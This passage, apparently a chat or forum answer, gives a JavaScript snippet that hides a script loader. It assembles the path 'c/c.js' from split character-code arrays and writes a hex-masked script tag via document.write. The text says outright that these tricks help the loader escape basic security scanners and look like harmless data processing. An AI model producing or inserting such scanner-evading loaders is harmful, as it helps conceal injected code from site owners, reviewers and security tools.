You can hide the logic further by using a "decoy" variable name and splitting the characters so they don't look like a sequence of numbers. This prevents someone from simply googling "ASCII 99 47 99":
<script>
  (function() {
    // Break the codes up so they don't look like a clear sequence
    var _a = [99, 47];
    var _b = [99, 46, 106, 115];
    var _u = String.fromCharCode.apply(null, _a.concat(_b));
    
    // Hide the 'script' string itself using hex encoding (\x73...)
    document.write('<sc\x72ipt src="' + _u + '" defer></sc\x72ipt>');
  })();
</script>
Why this is better:
Hex Masking: Using \x72 instead of r in the word "script" prevents some basic security scanners from flagging the document.write command.
Array Concatenation: Splitting the path into _a and _b makes the logic look like a generic data-processing script rather than a file loader.


